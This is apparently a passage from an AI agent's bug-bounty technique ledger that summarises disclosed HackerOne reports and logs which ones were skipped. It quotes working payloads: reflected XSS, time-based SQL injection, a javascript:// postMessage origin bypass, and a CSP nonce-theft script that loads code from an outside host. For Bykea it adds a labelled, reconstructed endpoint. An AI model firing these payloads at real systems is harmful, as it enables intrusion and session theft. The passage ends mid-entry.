# general-technique — part 15/45 (1 segment(s))
# content-aware dedupe applied; every unique entry preserved.

### [bugbountyhuntingskills.md] RESULT: 1 entry appended (1 new §17 slot, §17.472); 6 sources read, 0 fabricated, 0 invented

READ ONE BY ONE in the assigned order. 6 sources read; 1 appended; 5 valid-but-nothing-new
(team-summary-only / no-chain primitive / duplicate / not-worth-recording) recorded honestly below
and in the harvest ledger.

---

SOURCE: https://hackerone.com/reports/3295503  2026-11-11
ROUTE: `web_extract` on the live HackerOne report page -> HTTP 200, but the body is ONLY the program's
"Summary by Bykea" plus the timeline; the live `.json` route answers `visibility: no-content` with
`vulnerability_information` 0 B (no researcher body, no request shape, no endpoint, no parameter
published anywhere). Route that worked: the live HTML page's program summary. The technique below is
carried by the PROGRAM'S OWN SUMMARY, verbatim.
STATUS: UNVERIFIED (not reproduced — no Bykea endpoint was touched this pass; the chain is the
program's own summary wording and the request shape is labelled as NOT published).
CLASS: business logic with monetary/account impact — a CUSTOMER can update the STATUS of an
INDIVIDUAL TRIP inside a BATCH even though only BATCH-LEVEL status changes were intended, so a
one-parcel batch is driven into an INCONSISTENT STATE that locks the assigned PARTNER into a booking
they can neither complete nor cancel (HackerOne weakness "Business Logic Errors", reporter
`sameer_ali`, submitted 2025-08-12 / disclosed 2025-11-20, resolved, bounty paid by Bykea).
CORE METHOD (verbatim from the program's summary):
  1. THE FINDING, verbatim: "A logic flaw allowed users to update the status of individual trips
     inside a batch, even though only batch-level status changes were intended."
  2. THE EXPLOIT, verbatim: "By cancelling the single trip inside a one-parcel batch, an attacker
     could place the batch into an inconsistent state, causing the assigned partner to get stuck in
     a booking they could not complete or cancel."
  3. THE REQUEST SHAPE (NOT published anywhere — no endpoint, no parameter and no payload is in the
     public record; recorded as labelled reconstruction so the entry is testable): the customer app
     cancels an individual trip by calling the trip-status endpoint with the trip's own id and the
     new status (`PUT/POST /api/v2/trips/{trip_id}/status` with body `{"status":"cancelled"}`), while
     the platform's intent is that cancellation is driven from the BATCH object
     (`/api/v2/bookings/{batch_id}`). The defect is that the TRIP-LEVEL endpoint performs NO CHECK
     that the trip is NOT part of a multi-party/multi-parcel batch, and does NOT re-validate the
     batch's aggregate state after the trip's status changes.
DETECTION SIGNAL: a booking / order / shipment model that has BOTH a batch (collection) object and
individual trip/parcel/order items, with status transitions exposed on the ITEM as well as on the
BATCH; an item-status endpoint that accepts an item id with no batch-context check; a one-item batch
or a batch whose items are owned by DIFFERENT parties (a partner/driver/merchant and a customer);
an assigned party whose workflow (complete / cancel / payout) is driven by the batch's aggregate
state rather than the item's own state. TELL: the item endpoint and the batch endpoint disagree
about who may change status — the item endpoint does not re-validate the batch.
CHAIN: an ordinary customer (primitive: a low-privilege account, no special role) -> calls the
ITEM-level status endpoint on the single trip inside a one-parcel batch (primitive: the endpoint
authorizes the customer's own trip but never checks the batch context) -> the trip is marked
cancelled while the BATCH remains in its pre-cancellation state (escalation: the two objects are now
inconsistent — the batch says the parcel is still in flight, the trip says it is cancelled) -> the
assigned PARTNER's workflow is driven by the batch state, so the partner cannot complete (the trip
no longer accepts completion) and cannot cancel (the batch-level cancel path no longer matches) the
booking (impact: the partner is locked into a booking they cannot act on — lost availability, lost
earnings, support escalation; a monetary/availability impact on a third party, which is why the
program paid a bounty). Per doctrine §8: preconditions = a customer account with a booking whose
batch contains a single parcel; gain = the assigned partner is locked out of completing or
cancelling the booking.
TRANSFERABLE TEST: on ANY platform with batch/collection + item objects (ride-hailing, delivery,
logistics, booking, order management, multi-vendor checkout) — (1) enumerate the ITEM-level status
endpoints (`/trips/{id}/status`, `/orders/{id}/cancel`, `/parcels/{id}/status`) and note whether
they accept an item id WITHOUT a batch/collection id; (2) place the item inside a one-item batch
(or a batch whose items belong to different parties) and call the ITEM endpoint to cancel/complete
it; (3) then call the BATCH endpoint to list the batch and to cancel/complete it — if the batch
still shows the item as active, or the batch-level action now fails / no-ops while the item shows
cancelled, the two objects are inconsistent and you have the primitive; (4) confirm the IMPACT by
observing the OTHER party's (partner/driver/merchant) view or API — the tell that it is a real
locking bug is that the partner's own complete/cancel call is rejected. Rule: **an item-level status
endpoint that never re-validates the BATCH context lets a customer drive a batch into an
inconsistent state — cancel the single trip inside a one-parcel batch and the assigned partner is
locked into a booking they can neither complete nor cancel.**
DEDUPE / DELTA: 0 hits across all three write targets for `3295503`, `sameer_ali`, `batch-level`,
`trip status`, `one-parcel batch`, `locking of partner`, `inconsistent state` (as a business-logic
sink). Pre-existing Bykea material REVIEWED as related-but-distinct: #2868164 (§17.391 — a
Bronze/negative-balance driver RESETS the availability flag via `PUT /api/v2/driver/update/location`
with an unbound `trip_id`, then bids; a RESTRICTION-GATE bypass, not a batch/item state split),
#2861888 (an IDOR-able config endpoint returns the hash that authorizes a bid), #3085742 (IDOR on
an in-app hardcoded endpoint), #2209750 (§17.375 — a realtime feed leaks `trip_no` before assignment,
a BAC primitive) and #3328343 (minimum bid value, low, no body). NONE records a BATCH-vs-ITEM status
split whose impact is locking a THIRD PARTY (the partner) into an un-actionable booking. New general
method -> §17.472.

---

VALID-BUT-NOT-APPENDED (read, nothing new):

- HackerOne #3360293 (Mars, "Publicly accessible `█████████` endpoint exposing internal user
  identifiers and email addresses", reporter `xgoon`, submitted 2025-09-27, disclosed 2026-02-24,
  weakness Information Disclosure, severity Medium 4.6 — downgraded from high by HackerOne triage;
  ROUTE: `web_extract` on the live page -> HTTP 200, body read; the live `.json` route answers
  `visibility: full` with a team summary only; `r.jina.ai` on the same URL also read the full body).
  FINDING, verbatim: "A security researcher identified an unauthenticated JSON API endpoint that
  exposed sensitive user information including internal UUIDs, display names, and corporate email
  addresses. The endpoint returned privileged account details such as administrative roles without
  requiring authentication, enabling user enumeration and potential targeted attacks." NOT
  APPENDED — the endpoint path is REDACTED (`█████████`) in the disclosed title and no request shape,
  parameter or identifier is published anywhere, so there is no reproducible test to record; the
  class (unauthenticated JSON API leaking internal UUIDs / corporate emails / admin roles) is
  already owned by the ledger's unauth-endpoint / identifier-disclosure material. Held as a lead;
  no entry, no §17 slot.

- HackerOne #3091390 (Revive Adserver, "Reflected Cross-Site Scripting (XSS) in Revive Adserver
  5.5.2", reporter `env_bak`; ROUTE: `web_extract` on the live page -> HTTP 200 but the body is the
  empty JS shell; the browser tool on the same URL -> "Sorry, something went wrong" application
  error; `r.jina.ai` -> HTTP 200 with the FULL body read; the Wayback copy is a JS-disabled shell.
  Route that worked: `r.jina.ai`). FINDING, verbatim: "A reflected Cross-Site Scripting (XSS)
  vulnerability has been identified in Revive Adserver version 5.5.2 ... The vulnerability is
  present in the admin-search.php file and can be exploited via the compact parameter." The code,
  verbatim: "The compact parameter is passed to the template without proper sanitization in
  www/admin/admin-search.php: `phpAds_registerGlobalUnslashed('keyword', 'client', 'campaign',
  'banner', 'zone', 'affiliate', 'compact'); ... if (!isset($compact)) { $compact = false; } ...
  $oTpl->assign('compact', $compact);`" and the sink is
  `lib/templates/admin/layout/search.html`. The PoC, verbatim:
  `http://target-ip/www/admin/admin-search.php?affiliate=1&banner=1&campaign=1&client=1&compact=1'> alert(document.cookie) &keyword=1&zone=1`.
  NOT APPENDED — a REFLECTED-parameter XSS in an admin page whose documented impact is
  `alert(document.cookie)` / "steal session cookies / perform actions on behalf of the victim"
  (asserted, no session-theft PoC, no ATO chain), which the task rules exclude as a standalone
  entry; the Revive Adserver family is already heavily recorded (the `executionorder` RXSS index
  row #3470970, the `bannerid` parent-authorized/child-unchecked IDOR §17.339, and the username
  blacklist §17.374) and the generic method — a request parameter assigned to a template and
  reflected unescaped — is the reflected-XSS class itself. Held as a lead; no entry, no §17 slot.

- HackerOne #3051155 (IBM, "Information disclosure on IBM training service endpoint", reporter
  `thpless`; ROUTE: `web_extract` on the live page -> HTTP 200, but the body is ONLY the program's
  boilerplate "Information disclosure on IBM training service endpoint was reported to IBM,
  analyzed and has been remediated. Thank you to our external researcher @thpless." with an empty
  timeline; the `.json` route is `visibility: no-content` with 0 B of researcher text; the Wayback
  copy is a JS-disabled shell). INVALID for extraction: no endpoint, no parameter, no request shape,
  no payload, no chain — nothing concrete is published, so no technique can be extracted without
  inventing it. Honest record: the report exists and is reachable, but it teaches nothing. No entry,
  no §17 slot.

- HackerOne #2764830 (curl, "CVE-2024-9681: HSTS subdomain overwrites parent cache entry", reporter
  `newfunction`, submitted 2024-10-07; ROUTE: `web_extract` on the live page -> HTTP 200 but the
  body is the empty JS shell; the browser tool -> application error; `r.jina.ai` -> extract
  timeout; the Wayback copy -> JS-disabled shell; the DECISIVE route was the CREDITED PUBLIC
  ADVISORY `https://curl.se/docs/CVE-2024-9681.html` (read in full, which links back to the report
  as "Original report"). FINDING, verbatim: "When curl is asked to use HSTS, the expiry time for a
  subdomain might overwrite a parent domain's cache entry, making it end sooner or later than
  otherwise intended ... When `x.example.com` responds with `Strict-Transport-Security:` headers,
  this bug can make the subdomain's expiry timeout bleed over and get set for the parent domain
  `example.com` in curl's HSTS cache." The rated impact, verbatim: "this is a potential minor DoS
  security problem ... or a cleartext transmission of data that was otherwise intended to possibly
  be protected"; severity Low, CWE-1025, bounty 540 USD, fixed in 8.11.0. NOT APPENDED — this is a
  CLIENT-SIDE (curl/libcurl) cache-expiry logic bug in the ASSIGNED application, not a
  server-side web-app technique transferable to a target; its own impact is rated Low and is a
  minor DoS / a cleartext-transmission edge case that the advisory itself argues is not a real
  security boundary ("HTTP is an insecure protocol and as such applications should not rely on nor
  trust such responses"), i.e. a hardening-class finding with no high/critical chain. The only
  adjacent material already recorded is §17.194 (curl's ATOMIC FILE REPLACE installing the temp
  file's permissions into a pre-existing HSTS/cookie store — a local file-permission bug, not a
  cache-key overwrite). Held as a lead; no entry, no §17 slot.

- HackerOne #2501986 (IBM, "IBM OpenPages vulnerable to exposure of sensitive information", reporter
  `0xhassan`, submitted 2024-05-12, disclosed 2024-10-01, weakness Improper Authentication -
  Generic, CVE-2024-35151, severity downgraded from critical 9.8 to medium by IBM staff;
  ROUTE: `web_extract` on the live page -> HTTP 200, body read (Summary by IBM + the full timeline,
  including the staff's severity downgrade and the CVE assignment; the researcher body is not
  published)). FINDING, verbatim: "IBM OpenPages vulnerable to exposure of sensitive information was
  reported to IBM, analyzed and has been remediated. Thank you to our external researcher
  @0xhassan." NOT APPENDED — no endpoint, no parameter, no request shape, no payload and no chain
  is published anywhere (the report is a boilerplate team summary; the CVE reference alone is not a
  technique), so there is nothing concrete to extract without inventing it. Honest record: the
  report is reachable and valid, but it teaches nothing reusable. No entry, no §17 slot.

0 fabricated. Knowledge intake only — NO target was touched; every network call this pass was a
read-only fetch of the 6 assigned HackerOne reports or their fallback routes (`r.jina.ai`,
`web.archive.org`, the credited `curl.se` advisory), plus local dedupe greps against the three write
targets. No hunt, no scan, no lab.

===== READER PASS 2026-11-11 — batch 163 (6 assigned sources read ONE BY ONE in the given order) =====
ROUTES: `web_extract` on the live page for all six; the `.json` route for #1436751 (`visibility: full`,
VI read in full), #2030076 (`no-content`, 0 B), #2131215 (`no-content`, 0 B), #1869613 (`visibility:
full`, VI read in full); `r.jina.ai` for #1869613 (the live `.json` was the decisive route —
`web_extract` on the HTML page timed out). 2 entries appended + 2 new §17 slots (§17.473–§17.474).

SOURCE: https://hackerone.com/reports/2254151  2026-11-11
STATUS: UNVERIFIED (not reproduced — no Nextcloud instance was stood up this pass; every step and
  quote below is taken from the report body and the vendor advisory GHSA-wfqv-cx85-7rjx, both read
  this pass)
CLASS: business logic / broken access control — cross-user read+write of personal data
  (CWE-284 Improper Access Control)
CORE METHOD:
  1. Precondition: an app that stores each user's personal data in a FIXED, predictable directory
     name (Nextcloud Notes uses `Notes/`), plus a user-provisioning state where the account EXISTS
     but has NEVER logged in (LDAP/SCIM-provisioned, admin-created, or invite-pending).
  2. The attacker — any user who can create and share a folder — creates a folder named EXACTLY the
     app's default data-directory name, `Notes/`, and shares it with the not-yet-logged-in victim.
     Nextcloud accepts a share addressed to a provisioned username that has never authenticated.
  3. The victim logs in for the FIRST time. The Notes app's first-run initialisation only checks
     whether the directory exists (`if (!file_exists($defaultDir)) mkdir(...)`-shaped) and never
     verifies OWNERSHIP, so it ADOPTS the attacker-shared `Notes/` folder as the victim's personal
     notes store instead of creating its own.
  4. Every note the victim creates is then written into the attacker-readable/writable shared
     folder; the attacker reads and modifies the victim's personal notes.
DETECTION SIGNAL: an app whose per-user data lives under a fixed/magic directory name; a first-run
  init path that creates the directory only if absent and never checks who owns it; a
  share/create-folder flow that accepts a provisioned-but-never-authenticated username; the victim's
  personal data appearing inside a folder the attacker can already see.
CHAIN: attacker can share + victim account provisioned but never logged in (primitives) -> share a
  folder named with the app's EXACT default data-directory name -> first-run init adopts the
  attacker's folder as the victim's personal store -> the victim's personal notes are written into
  attacker-readable/writable storage -> cross-user confidentiality AND integrity of the victim's
  notes (Medium 6.7, CWE-284; Nextcloud advisory GHSA-wfqv-cx85-7rjx — affected >= 4.6.0, patched
  4.9.3; report disclosed 2024-06-19, CVE-2024-37317).
TRANSFERABLE TEST: on any app that stores per-user data under a fixed directory name, create a
  folder with that EXACT name, share/deliver it to a newly provisioned user who has never logged in,
  have that user log in for the first time, and check whether the app's personal data lands in the
  folder you control. Generalise: any "create-if-absent, never verify ownership" first-run
  initialisation is a cross-user data-store hijack.

SOURCE: https://hackerone.com/reports/1238528  2026-11-11
STATUS: UNVERIFIED (not reproduced — no Safari/WordPress lab was stood up this pass; every code
  line, payload and step below is verbatim from the report body)
CLASS: DOM XSS — origin-check bypass via a browser URL-parser differential (CWE-79 / CWE-829)
CORE METHOD:
  1. The victim's WordPress page embeds the attacker's post through the wp-embed/oEmbed iframe; the
     embed page runs the postMessage handler `wp.receiveEmbedMessage`, which accepts
     `{secret, message, value}`.
  2. The handler's ONLY origin check is a HOST-STRING EQUALITY on a constructed anchor:
     `a = d.createElement("a"); a.href = r.getAttribute("src"); i = d.createElement("a");
     i.href = t.value; if (i.host === a.host) { ... c.top.location.href = t.value }` — the host of
     the attacker-supplied `value` is compared against the host of the embed iframe.
  3. The `secret` is not a barrier: it is carried in the embed page's own `location.hash`, so the
     attacker's embed page reads it and echoes it back.
  4. BYPASS: send `value = "javascript://" + document.location.host + "/%0aalert(document.domain);//"`.
     Safari's URL parser returns the AUTHORITY as `.host` even for a `javascript:` URL — the
     report's own console proof: `a.href="javascript://google.com/%0aalert(document.domain);//";
     a.host` -> `google.com` — so the host-equality check PASSES; Chrome and Firefox return an empty
     `.host` and reject it. The handler then assigns the `javascript:` URI to `top.location.href`,
     executing the JS in the TOP window (the victim blog's origin).
  5. Delivery: the attacker's embed page runs `if (document.location.hash.indexOf("secret") != -1) {
     secret = document.location.hash.split("=").slice(-1)[0]; window.setInterval(function() {
     window.parent.postMessage({"secret":secret,"message":"link","value":"javascript://"+
     document.location.host+"/%0aalert(document.domain);//"}, "*"); }, 500); }` — the interval also
     defeats the handler's `d.activeElement === r` focus requirement.
DETECTION SIGNAL: a postMessage/URL handler whose origin check compares `.host`/`.hostname` (or a
  URL-string prefix) of a user-supplied value against an expected host and then assigns that value to
  `location.href` / `window.open` / an `href`; a `javascript:` URI accepted because the check is
  HOST-based, not SCHEME-based. Tell: the check builds an `<a>`/`URL` from the untrusted value and
  reads `.host` — a parser-differential surface.
CHAIN: attacker's embed page inside the victim's iframe (primitive: the victim must embed the
  attacker's post) -> postMessage with `message:"link"` and a `javascript://<host>/%0a<payload>`
  value -> Safari's URL parser makes `.host` equal the iframe's host, so the origin check passes ->
  `top.location.href = value` executes the JS in the victim blog's origin -> session/credential read
  and actions as the victim (Medium 4-6.9; fixed in WordPress 6.2.1).
TRANSFERABLE TEST: for every handler that validates a user-supplied URL by comparing its host to an
  expected host (and then navigates to it), send
  `javascript://<expected-host>/%0aalert(document.domain);//` and check in Safari whether the host
  comparison passes and the JS executes; also try `data://`, `blob:`, `//<host>`,
  `https://<host>@<attacker>` and backslash/`%00` variants. A host-equality check that a
  `javascript:` URL can satisfy is an origin-check bypass.

VALID-BUT-NOT-APPENDED (read, nothing new):
- #1436751 (Acronis, "SQL injection in https://demor.adr.acronis.com/ via the username parameter",
  reporter `mmg`, submitted 2021-12-27, disclosed 2024-08-28, weakness SQL Injection, severity High
  7-8.9; ROUTE: `web_extract` live page -> HTTP 200, body read; the live `.json` route ->
  `visibility: full`, VI read in full). FINDING, verbatim: `POST /ng/api/auth/login` with
  `Content-Type: application/json` and body `{"username":"0'XOR(if(now()=sysdate(),sleep(35),0))XOR'Z",
  "id":"27","password":"cc4226..."}` -> "Which resulted in a 35 seconds delayed response"; the
  reporter lists 15.336 / 6.332 / 3.352 s timings. NOT APPENDED — the oracle
  (`0'XOR(if(now()=sysdate(),sleep(N),0))XOR'Z`) is already recorded (InnoGames URL-path time-based
  entry ~ledger 6234; the jawadmahdi "unique POST in Burp history" entry ~11694), the injection point
  (a JSON `username` in an unauthenticated login endpoint) is a new INSTANCE of the recorded
  time-based-blind-SQLi class, and the impact paragraph is boilerplate ("retrieve the contents of
  an entire database ... execute OS commands") with no extraction or auth-bypass PoC shown. Held as a
  lead; no entry, no §17 slot.
- #2131215 (Mozilla, "Subdomain takeover on one of the subdomain under mozaws.net", reporter
  `d0xing`, submitted 2023-09-01, disclosed 2024-02-11, weakness Misconfiguration, severity Medium;
  ROUTE: `web_extract` live page -> HTTP 200, team summary only; the `.json` route ->
  `visibility: no-content`, VI 0 B). INVALID for extraction / DUPLICATE: no subdomain name, no DNS
  record, no request and no PoC is published; this is the same mozaws.net finding family already
  evaluated and NOT appended (#2545012 / #2269867, ledger ~13805), and the dangling-CNAME takeover
  class is recorded (§1.6, §17.310, §17.320, the Snapchat sc-cdn.net entry, the Basecamp
  NS-delegation entry, §17.377). No entry, no §17 slot.
- #2030076 (Mozilla, "Mozilla FuzzManager API Token Exposed in Git Commit", reporter `yakirka`,
  submitted 2023-06-17, disclosed 2023-11-29, weakness Cleartext Storage of Sensitive Information,
  severity Critical; ROUTE: `web_extract` live page -> HTTP 200, team summary only; the `.json` route
  -> `visibility: no-content`, VI 0 B, only the team summary). INVALID for extraction: no repository,
  no commit, no token location, no endpoint and no request shape is published — nothing concrete to
  extract without inventing it. The general method (enumerate the org's public repos / commit history
  for a credential, replay it against that vendor's own API for read AND write) is already recorded
  (ledger ~4632, §9.5 "GitHub dorking with the API"). No entry, no §17 slot.
- #1869613 (HackerOne, "Attachment in published HackerOne report exposure private program", reporter
  `mateuszek`, submitted 2023-02-10, disclosed 2023-06-07, weakness Information Disclosure, severity
  downgraded critical 9.3 -> medium 4.4 -> final Low 3.8; ROUTE: `web_extract` on the live HTML page
  -> extract timeout; the `.json` route -> HTTP 200, `visibility: full`, VI read in full;
  `r.jina.ai` -> HTTP 200, full body read). FINDING, verbatim: "Report
  `https://hackerone.com/reports/1826141` reported to HackerOne became publuc. I see that the
  attached screenshot exposures private programs reports: `https://hackerone.com/██████████` and
  `https://hackerone.com/████`" and the reporter's own added impact list ("Not sufficient protection
  of sensitive data / Not sufficient blurring of sensitive data / Exposure of sensitive data");
  HackerOne staff: "As this was a human error and is therefore pretty hard to consistently exploit,
  we're updating the CVSS to reflect this." NOT APPENDED — this is a PLATFORM-SIDE disclosure on
  HackerOne's own asset (an unblurred attachment in a disclosed report), not a technique transferable
  to a target; the only reusable habit (check attachments in disclosed reports for unblurred data) is
  OSINT/recon, not a vulnerability class in the doctrine's §1 list. No entry, no §17 slot.

0 fabricated. Knowledge intake only — NO target was touched; every network call this pass was a
read-only fetch of the 6 assigned HackerOne reports (live page via `web_extract`, the `.json` route,
`r.jina.ai`) plus local dedupe greps against the three write targets. No hunt, no scan, no lab.

===== READER PASS 2026-11-11 — batch 164 (6 assigned sources read ONE BY ONE in the given order) =====
ROUTES: `web_extract` on the live page for #2912277, #2615670, #2223041 (HTTP 200, bodies read);
the live `.json` route for #2679108 (`visibility: full`, VI 491 B read in full), #2615670 (`full`,
VI 984 B), #2567048 (`full`, VI 1,318 B), #2223041 (`no-content`, VI 0 B), #2387458 (`full`, VI
1,442 B); `r.jina.ai` for #2679108 and #2223041 (HTTP 200, full body); Wayback for #2223041
(20240520225136 / 20240912131509 / 20250624051120 -> the JS-disabled shell); the browser tool for
#2223041 -> "Sorry, something went wrong". NOTHING NEW APPENDED — 0 entries, 0 §17 slots; 4 sources
read valid, 2 invalid for extraction. Per doctrine §5/§8, a pass that appends nothing new says so
explicitly rather than manufacturing an entry.

VALID-BUT-NOT-APPENDED (read, nothing new):
- #2912277 (curl, "Hackers Attack Curl Vulnerability Accessing Sensitive Information", reporter
  `scottarterbury`, submitted 2024-12-23, disclosed 2024-12-27, weakness Information Disclosure,
  severity Medium 4-6.9; ROUTE: `web_extract` live page -> HTTP 200, body read). FINDING, verbatim:
  "Security vulnerability when curl is used with a .netrc file for the credentials and also uses a
  HTTP redirect. Curl may leak passwords used for the host that redirects it to the next host.
  1.The .netrc file contains an entry matching the redirect target hostname 2. The entry either
  omits the password or both the login and password". The credited advisory (read this pass:
  https://curl.se/docs/CVE-2024-11053.html) confirms CVE-2024-11053 "netrc and redirect credential
  leak", reported by Harry Sintonen, CWE-200, severity Low, affected 6.5–8.11.0, fixed 8.11.1; the
  netrc `machine a.tld / login alice / password alicespassword / default / login bob` makes curl
  "pass on `alicespassword` as password even in the second transfer to the separate host `b.tld`".
  NOT APPENDED — the class (credential/info disclosure via a REDIRECT-FOLLOWING client: a redirect
  forwards the user's credentials to a different host) is already recorded (#1551586 / CVE-2022-27774,
  ledger ~5990), whose transferable test is "point a redirect-following client at your own host and
  have it 301 to a DIFFERENT host ... watch your listener for Authorization/USER/PASS/cookies".
  DELTA noted for the next pass: the .netrc variant leaks on a SAME-SCHEME (http→http) cross-host
  redirect, so the recorded test's "cross-scheme" framing is narrower than the real leak condition —
  the rule that matters is "drop credentials on a new HOST". Held as a lead; no entry, no §17 slot.
- #2679108 (HackerOne, "Bypass comment restriction", reporter `retat4`, submitted 2024-08-22,
  disclosed 2024-09-19, weakness Improper Access Control - Generic, severity Medium 5.3
  `AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N`; ROUTE: `web_extract` live page -> extract timeout; the live
  `.json` route -> HTTP 200, `visibility: full`, VI read in full; `r.jina.ai` -> HTTP 200, full body).
  FINDING, verbatim: "Hackerone disallows people with under 3000 reputation and 3 signal to comment
  on reports which have been closed as informative or N/A ... However you can bypass this and leave
  an infinite amount of comments by 'requesting disclosure', then cancelling it (if you want to
  write more messages), then request again and so on. you can attach a comment on each
  request/cancellation, effectively bypassing this measure". HackerOne triage closed it Informative:
  "there doesn't seem to be any significant security risk and/or security impact ... We are ok when
  researcher's comment using disclosure feature, the disclosure feature is working as intended."
  NOT APPENDED — a HackerOne PLATFORM-SIDE restriction bypass on HackerOne's own asset (same family
  as #1869613, ledger ~14450), not a technique transferable to a target; the impact is comment spam
  on a closed report (a non-sensitive action — doctrine §2(b)/(c)); no endpoint, no request shape and
  no payload is published. Held as a lead; no entry, no §17 slot.
- #2615670 (U.S. Dept Of Defense, "XSS on ███████", reporter `0xelkot`, submitted 2024-07-22,
  disclosed 2024-08-29, weakness Cross-site Scripting (XSS) - Reflected, severity Medium 5.3
  `AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N`; ROUTE: `web_extract` live page -> HTTP 200, body read; the
  live `.json` route -> HTTP 200, `visibility: full`, VI 984 B read in full). FINDING, verbatim: "1-
  go to https://█████████/thredds/dap4/%221%3CScRiPt%3Ealert%289218%29%3C%2FScRiPt%3E 2- You will see
  XSS is fired." The payload decodes to `"1<ScRiPt>alert(9218)</ScRiPt>` — a raw script tag
  URL-encoded into a THREDDS `/thredds/dap4/` path segment and reflected into the page. NOT
  APPENDED — a plain reflected XSS with no filter bypass, no encoding trick beyond URL-encoding, no
  context analysis and no demonstrated session impact (the impact list is boilerplate: "Cookie
  Stealing ... Malware download ... Defacement"); the path-segment-reflected-XSS class is already
  recorded (ledger ~12083 — a URL path carrying `"…<attr>=<value` with double-encoding and a high
  byte; ledger ~13967 — a path segment/param used as an I18n key). Held as a lead; no entry, no §17
  slot.
- #2567048 (Smule, "Possible Subdomain Takeover For Inbound Emails", reporter `cryptic_`, submitted
  2024-06-20, disclosed 2024-08-07, weakness Improper Access Control - Generic, severity null;
  ROUTE: the live `.json` route -> HTTP 200, `visibility: full`, VI 1,318 B read in full). FINDING,
  verbatim: "the affected url points to sendgrid.net, via a DNS CNAME record. As a result of this an
  attacker could potentially initate a subdomain take over by registering the subdomain
  email.smule.com on sendgrid ... should an attacker be able to gain access to the subdomain they
  could potentially gain access to emails too." Steps: "1. Go to email.smule.com 2. You will see 404
  Not Found". NOT APPENDED — the dangling-CNAME subdomain-takeover class is recorded (§1.6,
  §17.310, §17.320, the Snapchat sc-cdn.net entry ~4851, the Basecamp NS-delegation entry ~9429,
  §17.377); the email-interception -> password-reset-link -> ATO chain is recorded via a different
  vector (Cloudflare Email Routing, ledger ~3448); and this report does not demonstrate the takeover
  (only a 404 page + a CNAME), so there is no new technique. Held as a lead; no entry, no §17 slot.

INVALID FOR EXTRACTION (unreachable body / teaches nothing concrete):
- #2223041 (8x8, "Unprotected Atlantis Server at https://152.70.█.█", reporter `ahmadzuriqi3`,
  submitted 2023-10-23, disclosed 2024-04-11, weakness Improper Authentication - Generic, severity
  Medium 4~6.9). ROUTES TRIED, all fail to yield a researcher body: `web_extract` live page ->
  HTTP 200, the 8x8 team summary only; `r.jina.ai` -> HTTP 200, the same summary only; the live
  `.json` route -> HTTP 200, `visibility: no-content`, `vulnerability_information` 0 B; Wayback
  (20240520225136 / 20240912131509 / 20250624051120) -> the JS-disabled shell ("It looks like your
  JavaScript is disabled"); the browser tool -> "Sorry, something went wrong". The only public text
  is the team summary, verbatim: "Atlantis is an application for automating Terraform via pull
  requests. @fo00x reported to us an exposed Atlantis test server in our infrastructure. No
  sensitive information had been disclosed & we restricted access to the Atlantis service entirely,
  which resolved the issue." INVALID FOR EXTRACTION — no endpoint, no request shape, no payload, no
  PoC, and the program states no sensitive information was disclosed, so there is no demonstrated
  impact; nothing concrete to extract without inventing it. No entry, no §17 slot.
- #2387458 (PortSwigger Web Security, "CSP Bypass and escalation of
  https://hackerone.com/reports/2279346", reporter `priyanshusharma9789`, submitted 2024-02-23,
  disclosed 2024-02-23, weakness Business Logic Errors, severity high 7.4 — the reporter's own
  rating, `AV:L/AC:H/PR:N/UI:N/S:U/C:H/I:L/A:H`; ROUTE: the live `.json` route -> HTTP 200,
  `visibility: full`, VI 1,442 B read in full). FINDING, verbatim: "I have gone through this report
  https://hackerone.com/reports/2279346 and their is CSP bypass where website has implemented
  security in that but after this i can escalate Again CSP bypass with using different Script ...
  But their is new way where i can escalate the bug with new script which is : var
  demo=document.createElement("img"); demo.src="https://i.ytimg.com/vi/0vxCFIGCqnI/maxresdefault.jpg";
  document.body.innerHTML="";demo.width="1000"; demo.height="1000";
  document.body.appendChild(demo); ... Steps: Go to https://portswigger.net/ Inject the script in
  console tab and see the impact ... In this website configuration on CSP header is not proper . In
  my attachment their is no header for img in CSP . So attacker can escalate the bug again with
  different scripts." INVALID FOR EXTRACTION — the report's own contribution is a SELF-XSS
  ("inject the script in console tab") plus a CSP-configuration opinion ("there is no header for img
  in CSP"), both ineligible (doctrine §2(a)/(c)); the "new script" (creating an `<img>`) has no
  security effect and the impact claim is "Escalate the bug with new script"; no entry point, no
  request shape, no demonstrated impact. LEAD ONLY (not appended): the report QUOTES, second-hand
  from #2279346, a concrete CSP-nonce-theft payload — an `<iframe srcdoc>` hosting an Angular
  `ng-csp` app that loads `https://www.google.com/recaptcha/about/js/main.min.js` (a CSP-allowed
  origin) and uses `<img src=x ng-on-error='w=$event.target.ownerDocument;a=w.defaultView.top.document.querySelector("[nonce]");b=w.createElement("script");b.src="//joaxcar.com/hack.js";b.nonce=a.nonce;w.body.appendChild(b)'>`
  to read the PARENT document's `[nonce]` element and append a script carrying that nonce. That is a
  real primitive (nonce theft via a framework expression in an allowed-origin context), it is NOT in
  the ledger, but it is quoted — not demonstrated here — and its entry point is console access;
  held as an unproven lead, not an entry, no §17 slot.

0 fabricated. Knowledge intake only — NO target was touched; every network call this pass was a
read-only fetch of the 6 assigned HackerOne reports (live page via `web_extract`, the `.json` route,
`r.jina.ai`, Wayback, the browser tool) plus local dedupe greps against the three write targets. No
hunt, no scan, no lab.

SOURCE: https://hackerone.com/reports/1486310  2026-11-11
ROUTE: full reporter body via the live `.json` route -> HTTP 200, `visibility: full`, `vulnerability_information` read in full (the live HTML page was not needed). 8x8, "admin.8x8.vc: Member users with no permission can integrate email to connect calendar via GET /meet-external/spot-roomkeeper/v1/calendar/auth/init?..", weakness Improper Access Control - Generic, severity High 8.3 (AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N), reporter `emperor` (verified, cleared), created 2022-02-20, disclosed 2023-02-15, bounty yes, asset `*.8x8.vc` max_severity critical.
STATUS: UNVERIFIED (not reproduced — no 8x8 tenant was touched and no OAuth flow was completed; the request shape, the returned URL and every step below are quoted verbatim from the report).
CLASS: broken access control / vertical privilege escalation — an OAuth/third-party-connect INIT endpoint is itself an authorization surface and carries NO function-level role check, so a low-privilege role can start a third-party integration whose linkage lands in a privileged tenant context (CWE-863 / CWE-284).
CORE METHOD:
  1. PREMISE TO VIOLATE: a MEMBER user has no access to the rooms area of the admin section (the UI denies it) — but an admin can add an e-mail there to sync calendars.
